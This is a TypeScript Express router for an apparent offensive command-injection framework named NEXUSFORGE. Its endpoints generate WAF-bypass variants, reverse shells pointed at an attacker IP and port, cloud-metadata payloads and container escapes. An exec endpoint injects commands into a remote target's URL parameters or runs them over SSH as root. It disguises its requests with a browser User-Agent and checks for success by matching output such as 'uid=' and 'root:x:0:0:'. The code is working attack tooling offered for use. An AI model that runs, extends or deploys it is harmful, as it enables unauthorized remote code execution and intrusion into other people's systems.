import { Router, type IRouter, type Request, type Response } from "express";
import {
  applyQuantumBypass,
  buildPayloadVariants,
  buildPolymorphicPayload,
  buildWafBypass,
  buildReverseShells,
  buildChunkedBypass,
  buildCloudMetaPayloads,
  buildContainerEscapes,
  buildContextPayloads,
  buildParameterPollution,
  isSelfTarget,
} from "../lib/bypassEngine.js";
import { logInjection } from "../lib/injectionLogger.js";
import { generateSuggestions } from "../lib/payloadAI.js";
import { sshExec } from "../lib/sshExec.js";

const router: IRouter = Router();

const ALL_MODES = [
  "classic","blind","oob","quantum","polymorphic","ifs","concat","hex","b64loop","env",
  "heredoc","unicode","null","wildcard","comment","double_enc",
  "brace","process_sub","arith","ansi_c","rev",
  "ssti","log4shell","xxe","polyglot",
  "rev_shell","cloud","container",
  "timing","stealth",
  "windows_timing","windows_rev","windows","antiforensics",
];

const ALL_ENGINES = ["bash","node","python","php","java","cpp","powershell","ruby","perl"];

const ENGINES_STATIC: Record<string, boolean> = {
  bash: true, node: true, python: true, php: true, java: true,
  cpp: true, powershell: true, ruby: true, perl: true,
};

router.get("/hub/health", (_req: Request, res: Response) => {
  res.json({
    status: "online",
    version: "9.0.0",
    timestamp: new Date().toISOString(),
    engines: ALL_ENGINES,
    modes: ALL_MODES,
  });
});

router.get("/hub/engines", (_req: Request, res: Response) => {
  res.json(ENGINES_STATIC);
});

router.post("/hub/bypass", (req: Request, res: Response) => {
  const { payload = "id" } = req.body as { payload?: string };
  res.json({ variants: buildWafBypass(payload) });
});

router.post("/hub/suggest", (req: Request, res: Response) => {
  const { mode, cmd = "id", attackerIp = "127.0.0.1", attackerPort = "4444" } =
    req.body as { mode?: string; cmd?: string; attackerIp?: string; attackerPort?: string };
  res.json({ suggestions: generateSuggestions(mode, cmd, attackerIp, attackerPort) });
});

router.post("/hub/shells", (req: Request, res: Response) => {
  const { attackerIp = "127.0.0.1", attackerPort = "4444" } =
    req.body as { attackerIp?: string; attackerPort?: string };
  res.json({ shells: buildReverseShells(attackerIp, attackerPort) });
});

router.post("/hub/chunked", (req: Request, res: Response) => {
  const { payload = "id", chunkSize = 16 } =
    req.body as { payload?: string; chunkSize?: number };
  res.json({ variants: buildChunkedBypass(payload, Number(chunkSize)) });
});

router.post("/hub/cloud", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  res.json({ payloads: buildCloudMetaPayloads(cmd) });
});

router.post("/hub/container", (req: Request, res: Response) => {
  const { cmd = "id" } = req.body as { cmd?: string };
  res.json({ payloads: buildContainerEscapes(cmd) });
});

router.post("/hub/context", (req: Request, res: Response) => {
  const {
    cmd          = "id",
    os           = "unknown",
    waf          = null,
    language     = "",
    attackerIp   = "127.0.0.1",
    attackerPort = "4444",
  } = req.body as {
    cmd?: string; os?: "windows" | "linux" | "unknown"; waf?: string | null;
    language?: string; attackerIp?: string; attackerPort?: string;
  };
  const payloads = buildContextPayloads(cmd, os, waf ?? null, language, attackerIp, attackerPort);
  res.json({ payloads, count: payloads.length, context: { os, waf, language } });
});

router.post("/hub/pollution", (req: Request, res: Response) => {
  const { param = "cmd", payload = "id" } = req.body as { param?: string; payload?: string };
  res.json({ variants: buildParameterPollution(param, payload) });
});

router.post("/hub/exec", async (req: Request, res: Response) => {
  const start = Date.now();
  const {
    cmd,
    engine        = "bash",
    mode          = "classic",
    targetUrl,
    injectParam   = "cmd",
    httpMethod    = "GET",
    customHeaders = "",
    attackerIp    = "127.0.0.1",
    attackerPort  = "4444",
    sshHost,
    sshPort       = 22,
    sshUser       = "root",
    sshPassword,
    sshKey,
  } = req.body as {
    cmd?: string; engine?: string; mode?: string;
    targetUrl?: string; injectParam?: string; httpMethod?: string; customHeaders?: string;
    attackerIp?: string; attackerPort?: string;
    sshHost?: string; sshPort?: number; sshUser?: string; sshPassword?: string; sshKey?: string;
  };

  if (!cmd || typeof cmd !== "string" || !cmd.trim()) {
    res.status(400).json({ error: "cmd is required" });
    return;
  }
  if (!targetUrl && !sshHost) {
    res.status(400).json({
      error: "targetUrl or sshHost required",
      hint: "NEXUSFORGE executes on remote targets only. Provide targetUrl for HTTP injection or sshHost+sshUser for SSH execution.",
    });
    return;
  }

  const processed = applyQuantumBypass(cmd, mode, attackerIp, attackerPort);

  try {
    // ── SSH execution ──────────────────────────────────────────────────────
    if (sshHost?.trim()) {
      const result = await sshExec(
        {
          host:       sshHost.trim(),
          port:       Number(sshPort) || 22,
          username:   (sshUser ?? "root").trim(),
          password:   sshPassword?.trim() || undefined,
          privateKey: sshKey?.trim() || undefined,
          timeoutMs:  30_000,
        },
        processed,
      );
      const elapsed = Date.now() - start;
      void logInjection(cmd, `ssh/${engine}`, mode, elapsed);
      res.json({ output: result.output, exitCode: result.exitCode, engine: `ssh/${engine}`, mode, elapsed, processed });
      return;
    }

    // ── HTTP injection ─────────────────────────────────────────────────────
    if (isSelfTarget(targetUrl!)) {
      res.status(400).json({ error: "Self-targeting is disabled — configure an external target URL." });
      return;
    }

    let parsedUrl: URL;
    try { parsedUrl = new URL(targetUrl!); } catch {
      res.status(400).json({ error: `Invalid targetUrl: ${targetUrl}` });
      return;
    }

    const variants = mode === "polymorphic"
      ? [buildPolymorphicPayload(cmd, "quantum")]
      : buildPayloadVariants(processed);
    const payload  = variants[0] ?? processed;
    const method   = httpMethod.toUpperCase();

    const hdrs: Record<string, string> = {
      "User-Agent":      "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
      "Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Cache-Control":   "no-cache",
    };
    for (const line of (customHeaders ?? "").split(/\r?\n/)) {
      const sep = line.indexOf(":");
      if (sep > 0) hdrs[line.slice(0, sep).trim()] = line.slice(sep + 1).trim();
    }

    let fetchUrl:  string;
    let fetchBody: string | undefined;

    if (method === "GET" || method === "DELETE") {
      parsedUrl.searchParams.set(injectParam, payload);
      fetchUrl = parsedUrl.toString();
    } else if (method === "JSON") {
      hdrs["Content-Type"] = "application/json";
      fetchUrl  = parsedUrl.toString();
      fetchBody = JSON.stringify({ [injectParam]: payload });
    } else {
      hdrs["Content-Type"] = "application/x-www-form-urlencoded";
      fetchUrl  = parsedUrl.toString();
      fetchBody = new URLSearchParams({ [injectParam]: payload }).toString();
    }

    const response = await fetch(fetchUrl, {
      method:  method === "JSON" ? "POST" : method,
      headers: hdrs,
      body:    fetchBody,
      signal:  AbortSignal.timeout(30_000),
    });
    const text    = await response.text();
    const elapsed = Date.now() - start;
    void logInjection(cmd, engine, mode, elapsed);

    const confirmed =
      /uid=\d+\(\w+\)\s+gid=\d+/.test(text)           ||
      /root:x:0:0:/.test(text)                          ||
      /Linux \S+ \d+\.\d+\.\d+/.test(text)              ||
      /Microsoft Windows \[Version \d/.test(text)        ||
      /\bNT AUTHORITY\\\w+/.test(text)                  ||
      /^PATH=\//m.test(text) || /^HOME=\//m.test(text)  ||
      (/total \d+/.test(text) && /drwx/.test(text));

    res.json({ output: text.slice(0, 8192), status: response.status, confirmed, engine, mode, elapsed, processed, payload });

  } catch (e: unknown) {
    const msg = (e as Error).message ?? String(e);
    res.status(500).json({ error: msg });
  }
});

export default router;
